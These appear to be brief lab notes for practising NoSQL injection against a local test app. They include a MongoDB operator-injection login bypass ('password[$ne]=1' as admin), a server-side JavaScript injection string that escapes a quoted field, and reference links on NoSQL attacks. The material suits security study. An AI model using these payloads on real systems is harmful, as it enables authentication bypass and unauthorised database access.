http://127.0.0.1:8000/join.php -> register as admin


Burp required
POST http://127.0.0.1:8000/login.php
login=admin&password[$ne]=1&submit=Submit

SSJS

LOGUT REQUIRED
http://127.0.0.1:8000/logout.php


http://127.0.0.1:8000/ssjs.php
username = blabla
password = 1'; var passs = db.version(); var test='


https://www.owasp.org/index.php/Testing_for_NoSQL_injection
https://habr.com/ru/company/xakep/blog/143909/
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/NoSQL%20Injection
Удар по MongoDB - Сценарии атаки на Nosql базу данных ZerpNights 2012
